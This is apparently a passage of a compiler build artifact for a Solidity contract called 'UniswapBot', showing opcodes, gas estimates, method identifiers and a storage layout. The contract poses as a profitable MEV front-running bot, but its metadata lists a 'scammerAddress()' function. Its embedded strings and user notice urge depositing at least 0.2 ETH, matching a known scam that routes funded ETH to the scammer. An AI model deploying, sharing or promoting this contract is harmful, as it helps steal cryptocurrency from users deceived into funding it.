ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220E6F3 0x2F 0x1F 0xF LT 0x4A CALLDATALOAD DUP16 SAR CALLDATACOPY 0xA9 0xA8 PUSH12 0x740DA37A7D83DB8139B04A3D JUMPI 0x2E 0xEF SWAP12 0xDA CREATE PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "616400",
						"executionCost": "651",
						"totalCost": "617051"
					},
					"external": {
						"scammerAddress()": "infinite",
						"start()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"_callMEVAction()": "infinite",
						"beyond(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct UniswapBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "23",
						"getMemPoolHeight()": "23",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "23",
						"keccak(struct UniswapBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct UniswapBot.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "213",
						"uint2str(uint256)": "infinite",
						"withdrawalProfits()": "infinite"
					}
				},
				"methodIdentifiers": {
					"scammerAddress()": "ab1c067d",
					"start()": "be9a6555",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 7,
						"contract": "contracts/bot.sol:UniswapBot",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 9,
						"contract": "contracts/bot.sol:UniswapBot",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 11,
						"contract": "contracts/bot.sol:UniswapBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {},
				"notice": "Testnet transactions will fail as there is no value Updated Build Min liquidity after gas fees has to equal 0.2 ETH"
			}
		}
	}
}